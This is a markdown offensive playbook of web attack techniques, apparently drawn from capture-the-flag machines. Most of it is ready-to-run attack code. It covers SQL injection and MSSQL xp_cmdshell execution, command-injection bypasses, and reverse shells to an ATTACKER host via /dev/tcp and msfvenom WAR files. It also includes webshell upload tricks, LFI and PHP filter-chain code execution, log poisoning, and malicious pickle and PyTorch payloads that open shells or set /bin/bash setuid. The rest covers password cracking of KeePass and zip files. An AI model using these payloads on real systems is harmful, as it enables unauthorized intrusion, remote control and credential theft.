# Web Attack Playbook — Husky Hacker

Based on real techniques from: bedside, trilocor, exghost, Aftermath, Sled, blocksynergy, HSM Defense, New Hire, Haystack, cohort.

---

## 1. Enumeration (Every Web Port)

```bash
# Fingerprint first
whatweb -a 3 http://$TARGET
curl -sI http://$TARGET

# Directory scan with extensions
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,asp,aspx,jsp,bak,old,conf,zip,sql -t 30

feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 30 -k

# Vhost / subdomain enum
gobuster vhost -u http://$TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain

ffuf -u http://$TARGET -H "Host: FUZZ.$DOMAIN" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>

# robots.txt / sitemap
curl -s http://$TARGET/robots.txt
curl -s http://$TARGET/sitemap.xml
```

**What to look for:**
- `/admin`, `/login`, `/upload`, `/portal`, `/support`, `/api`
- Hidden vhosts (trilocor: `xgc` vhost was NOT in AXFR but found via ffuf)
- Version numbers in headers/footers → searchsploit immediately
- Team/staff pages → username generation

---

## 2. SQL Injection

**Used on:** Sled (shipment portal), New Hire (MSSQL), trilocor (jobs portal)

### Detection
```bash
# Test with webtester
webtester sqli -u "http://$TARGET/login.php" --param user -m POST

# Manual
' OR 1=1-- -
" OR 1=1-- -
' ORDER BY 1-- -
' UNION SELECT NULL-- -
```

### UNION-Based (Sled pattern)
```bash
# Find column count
' ORDER BY 1-- -
' ORDER BY 5-- -   # increase until error

# Find display column
' UNION SELECT 1,2,3,4,5-- -

# Extract data
' UNION SELECT 1,username,password,4,5 FROM users-- -
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -

# Auth bypass
' OR '1'='1'-- -
admin' OR 1=1-- -
```

### MSSQL (New Hire pattern)
```sql
-- After getting SQL access (MSSQL client)
-- Check if you can impersonate SA
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate SA
EXECUTE AS LOGIN = 'sa';

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <BASE64_REVSHELL>';
```

---

## 3. Command Injection

**Used on:** Sled (report search grep), blocksynergy (ping), Frostbite (sensor_id)

### Common Separators
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid          # newline injection
```

### Bypass Filters
```bash
# Space bypass
${IFS}         # ; cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd

# Keyword bypass
wh$()oami
/bin/c?t /etc/passwd
```

### URL-Based Injection (blocksynergy pattern)
```
# URL parsing trick — inject into hostname
http://;COMMAND;@0.0.0.0:8080/
```

### Python subprocess (Frostbite pattern)
```
# If app uses subprocess with shell=True
sensor_id=1;id
sensor_id=1;bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261
```

---

## 4. File Upload Bypass

**Used on:** bedside (MIME/magic bypass), trilocor (apply.php), exghost (ExifTool)

### Extension Bypass Matrix
```
.php  .phtml  .php5  .php7  .pht  .phar
.pHp  .pHtml                # case variation
.php.jpg  .php.png           # double extension
.php%00.jpg                  # null byte (legacy)
.php%0a.jpg                  # newline
.php.                        # trailing dot (Windows)
.php::$DATA                  # NTFS ADS (IIS)
```

### MIME Type Spoofing
```bash
# Change Content-Type in the multipart upload
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Prepend
```bash
# GIF header before PHP code
GIF89a
<?php system($_GET['c']); ?>

# JPEG header
printf '\xff\xd8\xff\xe0' > shell.php.jpg
cat webshell.php >> shell.php.jpg

# PNG header
printf '\x89PNG\r\n\x1a\n' > shell.phtml
cat webshell.php >> shell.phtml
```

### PHP Filter Chain Upload (trilocor pattern)
```bash
# When you can upload but can't execute — use filter chain to rename
# 1. Upload webshell as allowed extension (a.jpg)
# 2. Use LFI filter chain to execute code that renames it
php_filter_chain_generator --chain '<?=$_GET[0];;?>'
# 3. Fire with parameter: &0=cp ./uploads/a.jpg ./uploads/a.php
```

### ExifTool RCE (exghost pattern — CVE-2021-22204)
```bash
# If server processes image metadata with ExifTool ≤ 12.23
searchsploit exiftool
searchsploit -m 50911

# Generate payload image
python3 50911.py <ATTACKER_IP> <PORT>
# Upload the crafted image → triggers RCE when ExifTool processes it
curl -F "myFile=@image.jpg" http://$TARGET/upload.php
```

---

## 5. Local File Inclusion (LFI)

**Used on:** trilocor (prototype.beta), bedside (Docker internal service)

### Path Traversal
```bash
../../../../../../../etc/passwd
....//....//....//etc/passwd      # double-dot bypass
..%2f..%2f..%2fetc/passwd         # URL-encoded
..%252f..%252fetc/passwd          # double URL-encoded
..%c0%af..%c0%afetc/passwd        # overlong UTF-8
%2e%2e%2f%2e%2e%2fetc/passwd      # full URL-encoded dots
..%2f..%2f                        # bedside pattern (worked on Docker internal service)
```

### PHP Filter (trilocor pattern — source code read)
```bash
# Read source code as base64
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=db.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=.env

# Decode
echo "BASE64_OUTPUT" | base64 -d
```

### PHP Filter Chain RCE (trilocor key technique)
```bash
# Generate a chain that executes PHP code via filters alone
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'

# Fire it — the code= and page= params both needed (trilocor quirk)
curl "http://$TARGET/index.php?code=*&page=<GENERATED_CHAIN>&0=id"

# URL-encode the command parameter properly
curl --data-urlencode "0=cp ./uploads/shell.jpg ./uploads/shell.php" \
  "http://$TARGET/index.php?code=*&page=<CHAIN>"
```

### Wrappers for RCE
```bash
# php://input (POST body becomes PHP)
curl -s "http://$TARGET/page.php?file=php://input" \
  --data '<?php system("id"); ?>'

# data:// (inline code)
echo -n '<?php system("id"); ?>' | base64
curl "http://$TARGET/page.php?file=data://text/plain;base64,<BASE64>"

# expect:// (if enabled)
curl "http://$TARGET/page.php?file=expect://id"
```

### Log Poisoning
```bash
# Poison Apache access log with PHP in User-Agent
curl -A '<?php system($_GET["c"]); ?>' http://$TARGET/
# Then include the log
http://$TARGET/page.php?file=../../../../var/log/apache2/access.log&c=id
```

---

## 6. CMS Exploitation

### WordPress
```bash
# Enumerate users, plugins, themes
wpscan --url http://$TARGET -e u,ap,at --api-token <TOKEN>

# Brute force
wpscan --url http://$TARGET -U admin -P /usr/share/wordlists/rockyou.txt

# Plugin RCE (common vectors)
# Check installed plugins → searchsploit each
curl -s http://$TARGET/wp-content/plugins/ | grep -oP 'href="[^"]*"'

# Theme editor RCE (if admin)
# Appearance → Theme Editor → 404.php → insert PHP webshell
# Trigger: http://$TARGET/wp-content/themes/<theme>/404.php?c=id
```

### Drupal (trilocor pattern)
```bash
# Version check
curl -s http://$TARGET/CHANGELOG.txt | head -5

# Drupalgeddon2 (CVE-2018-7600) — Drupal 7.x < 7.58, 8.x < 8.3.9
searchsploit drupalgeddon
python3 drupalgeddon2.py http://$TARGET/

# Drupalgeddon3 (CVE-2018-7602) — needs auth
```

### Roundcube (Aftermath, Haystack pattern)
```bash
# Version check — look at login page source or /program/resources/
# CVE-2025-49113 — PHP object deserialization RCE (post-auth)
# Need valid credentials first, then exploit the vuln
```

### Tomcat
```bash
# Default creds on /manager/html
tomcat:tomcat
admin:admin
tomcat:s3cret

# WAR file upload (if manager access)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f war -o shell.war
curl -u 'tomcat:tomcat' --upload-file shell.war "http://$TARGET:8080/manager/text/deploy?path=/shell"
curl http://$TARGET:8080/shell/
```

### Liferay (trilocor pattern)
```bash
# Groovy script console (if admin)
# Control Panel → Server Administration → Script
# Paste Groovy reverse shell
```

---

## 7. SSRF / Redirect Bypass

**Used on:** blocksynergy

```bash
# Basic SSRF
http://127.0.0.1:8080/admin
http://localhost/admin
http://0.0.0.0/admin

# Redirect bypass (blocksynergy pattern)
# URL parsing tricks to reach internal services
http://attacker.com@internal:8080/
http://;cmd;@0.0.0.0:8080/    # inject into hostname
```

---

## 8. Deserialization

**Used on:** Aftermath (PHP), bedside (Python pickle/torch), Frostbite (Redis module)

### PHP Object Deserialization
```bash
# If unserialize() called on user input
# Look for __destruct, __wakeup, __toString magic methods
# CVE-2025-49113 (Roundcube) — exploit chain via crafted POST
```

### Python Pickle RCE
```python
# If pickle.loads() or torch.load() on user-controlled data
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",))

pickle.dump(Exploit(), open("payload.pkl", "wb"))
```

### PyTorch checkpoint (bedside pattern)
```python
# torch.load does pickle.loads internally
import torch, os

class E:
    def __reduce__(self):
        return (os.system, ("chmod +s /bin/bash",))

torch.save(E(), "/path/to/checkpoint.pt")
# Trigger: sudo python3 /opt/script.py (loads checkpoint)
# Then: /bin/bash -p → root
```

---

## 9. IDOR / Access Control

**Used on:** Meridian (status.php?id=), Sled (report search)

```bash
# Parameter manipulation
http://$TARGET/status.php?id=1001
http://$TARGET/status.php?id=1002
http://$TARGET/profile?user=admin

# Burp Intruder — iterate IDs
# Or quick bash loop:
for i in $(seq 1000 1100); do
  curl -s "http://$TARGET/status.php?id=$i" | grep -i "password\|pass\|credential" && echo "HIT: $i"
done
```

---

## 10. Password & Credential Leaks

**Common locations found across boxes:**

```bash
# Git history (exghost, trilocor)
git log --oneline --all
git diff HEAD~5
git show <commit>

# .env files
curl http://$TARGET/.env

# Config files
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/configuration.php
/var/www/html/database.yml

# KeePass databases (New Hire pattern)
# Download .kdb/.kdbx → crack master password
keepass2john Database.kdb > keepass.hash
hashcat -m 13400 keepass.hash rockyou.txt
# Or john --wordlist=rockyou.txt keepass.hash

# Zip files with passwords (exghost, Haystack)
zip2john archive.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# PCAP analysis (exghost)
# Open in Wireshark → Follow HTTP Stream → look for creds
```

---

*"Check the source, read the config, trace the upload." — Husky Hacker*
